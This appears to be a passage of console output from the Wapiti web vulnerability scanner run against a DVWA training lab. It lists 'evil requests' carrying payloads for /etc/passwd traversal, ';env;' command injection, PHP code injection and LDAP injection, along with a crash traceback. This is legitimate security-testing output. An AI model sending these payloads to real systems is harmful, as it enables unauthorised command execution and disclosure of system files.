    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/exec/
    cookie: security=low; PHPSESSID=fdcdh8udcmu244uflibfsd872f
    content-length: 35
    Content-Type: application/x-www-form-urlencoded

    ip=%2Fetc%2Fpasswd%00&Submit=Submit
---
---
Linux local file disclosure vulnerability in http://192.168.55.106/DVWA/vulnerabilities/fi/ via injection in the parameter page
Evil request:
    GET /DVWA/vulnerabilities/fi/?page=%2Fetc%2Fpasswd HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=fdcdh8udcmu244uflibfsd872f
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/xss_s/
Evil request:
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=low; PHPSESSID=fdcdh8udcmu244uflibfsd872f
    content-length: 94
    Content-Type: application/x-www-form-urlencoded

    txtName=%2Fetc%2Fpasswd&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/brute/
Evil request:
    GET /DVWA/vulnerabilities/brute/?username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&password=Letm3in_&Login=Login HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=li193a379hejvp7fm55is79b6j
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/setup.php
Evil request:
    POST /DVWA/setup.php HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/setup.php
    cookie: security=low; PHPSESSID=fdcdh8udcmu244uflibfsd872f
    content-length: 72
    Content-Type: application/x-www-form-urlencoded

    create_db=%2Fetc%2Fpasswd%00&user_token=629501a8c3229f8438c64ddd4876a4aa
---
Invalid URL: http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=low.php%3A%3A%24DATA potentially vulnerable to open redirect
1 requests were skipped due to network issues

[*] Launching module cms
No Drupal Detected
No Joomla Detected
No PrestaShop Detected
No SPIP Detected
No WordPress Detected

[*] Launching module wp_enum
No WordPress Detected

[*] Launching module ldap
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/info.php
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/info.php?id=%2A%29%29%00nosuchvalue HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=impossible; PHPSESSID=ges50a9rhm6cpqakm7o7udht2p
---

[*] Launching module exec
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/open_redirect/source/info.php
Evil request:
    GET /DVWA/vulnerabilities/open_redirect/source/info.php?id=id HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=impossible; PHPSESSID=lp36l4b113hibasu6qid1rr7f8
---
---
Command execution in http://192.168.55.106/DVWA/vulnerabilities/exec/ via injection in the parameter ip
Evil request:
    POST /DVWA/vulnerabilities/exec/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/exec/
    cookie: security=low; PHPSESSID=lp36l4b113hibasu6qid1rr7f8
    content-length: 26
    Content-Type: application/x-www-form-urlencoded

    ip=%3Benv%3B&Submit=Submit
---
An exception occurred in module exec
Traceback (most recent call last):
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/wapitiCore/attack/active_scanner.py", line 199, in _attack_wrapper
    await attack_module.attack(request, response)
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/wapitiCore/attack/mod_exec.py", line 99, in attack
    response: Response = await self.crawler.async_send(mutated_request)
                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/wapitiCore/net/crawler.py", line 350, in async_send
    return await self.async_get(
           ^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/wapitiCore/net/crawler.py", line 62, in inner_wrapper
    value = await function(*args, **kwargs)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/wapitiCore/net/crawler.py", line 252, in async_get
    response = await self._client.send(
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 1629, in send
    response = await self._send_handling_auth(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 1657, in _send_handling_auth
    response = await self._send_handling_redirects(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 1715, in _send_handling_redirects
    raise exc
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 1704, in _send_handling_redirects
    request = self._build_redirect_request(request, response)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 481, in _build_redirect_request
    url = self._redirect_url(request, response)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_client.py", line 533, in _redirect_url
    url = url.copy_with(host=request.url.host)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_urls.py", line 340, in copy_with
    return URL(self, **kwargs)
           ^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_urls.py", line 119, in __init__
    self._uri_reference = url._uri_reference.copy_with(**kwargs)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_urlparse.py", line 198, in copy_with
    return urlparse("", **defaults)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_urlparse.py", line 327, in urlparse
    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
  File "/home/michal/.local/share/pipx/venvs/wapiti3/lib/python3.12/site-packages/httpx/_urlparse.py", line 433, in validate_path
    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
Wapiti 3.2.10. httpx 0.28.1. OS linux
Sending crash report f90dd929-d30b-11f0-9bcc-90658474e163 ... SUCCESS
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/sqli/
Evil request:
    GET /DVWA/vulnerabilities/sqli/?id=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&Submit=Submit HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=lp36l4b113hibasu6qid1rr7f8
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/brute/
Evil request:
    GET /DVWA/vulnerabilities/brute/?username=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&password=Letm3in_&Login=Login HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=lp36l4b113hibasu6qid1rr7f8
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/xss_s/
Evil request:
    POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/xss_s/
    cookie: security=low; PHPSESSID=ak19pb7jnojivtc63is9el74dl
    content-length: 95
    Content-Type: application/x-www-form-urlencoded

    txtName=default%3Benv%3B&btnSign=Sign%20Guestbook&btnClear=Clear%20Guestbook&mtxMessage=Hi%20there%21
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/sqli_blind/
Evil request:
    GET /DVWA/vulnerabilities/sqli_blind/?id=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&Submit=Submit HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=low; PHPSESSID=ak19pb7jnojivtc63is9el74dl
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/javascript/
Evil request:
    POST /DVWA/vulnerabilities/javascript/ HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.55.106/DVWA/vulnerabilities/javascript/
    cookie: security=impossible; PHPSESSID=5mfhblra5dob963q1lv2n32cgh
    content-length: 78
    Content-Type: application/x-www-form-urlencoded

    token=default&phrase=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&send=Submit
---
---
Received a HTTP 500 error in http://192.168.55.106/DVWA/vulnerabilities/csrf/
Evil request:
    GET /DVWA/vulnerabilities/csrf/?password_new=Letm3in_&password_conf=Letm3in_&Change=id HTTP/1.1
    host: 192.168.55.106
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=impossible; PHPSESSID=v1179cvfm5k95pejqphhqrvlag
---

[*] Launching module crlf

[*] Launching module shellshock

[*] Launching module ssl
sslscan is not installed or not found in PATH, module will be skipped

[*] Launching module ssrf
[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=ljwi0m for results, please wait...

[*] Launching module upload

[*] Launching module log4shell

[*] Launching module permanentxss

[*] Launching module methods
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Methods found in the header: OPTIONS,HEAD,POST,GET
Method DELETE returned a body content different from GET method on http://192.168.55.106/DVWA/login.php
Method PATCH returned a body content different from GET method on http://192.168.55.106/DVWA/login.php
Method PUT returned a body content different from GET method on http://192.168.55.106/DVWA/login.php
Method POST returned a body content different from GET method on http://192.168.55.106/DVWA/login.php
Method DELETE returned a body content different from GET method on http://192.168.55.106/DVWA/phpinfo.php
Method PATCH returned a body content different from GET method on http://192.168.55.106/DVWA/phpinfo.php
Method PUT returned a body content different from GET method on http://192.168.55.106/DVWA/phpinfo.php
Method POST returned a body content different from GET method on http://192.168.55.106/DVWA/phpinfo.php
Method DELETE returned a body content different from GET method on http://192.168.55.106/DVWA/security.php
Method PATCH returned a body content different from GET method on http://192.168.55.106/DVWA/security.php
Method PUT returned a body content different from GET method on http://192.168.55.106/DVWA/security.php
Method POST returned a body content different from GET method on http://192.168.55.106/DVWA/security.php
Method DELETE returned a body content different from GET method on http://192.168.55.106/DVWA/setup.php
Method PATCH returned a body content different from GET method on http://192.168.55.106/DVWA/setup.php
Method PUT returned a body content different from GET method on http://192.168.55.106/DVWA/setup.php
Method POST returned a body content different from GET method on http://192.168.55.106/DVWA/setup.php
Methods found in the header: OPTIONS,HEAD,POST,GET
Method POST returned a body content different from GET method on http://192.168.55.106/DVWA/vulnerabilities/javascript/

[*] Generating report...
A report has been generated in the file /home/michal/GolandProjects/Scanropod/reports/8596afff-d5f1-4b04-89de-a23c1377c5d1/wapiti-http_192.168.55.106_DVWA_-1765070740.json
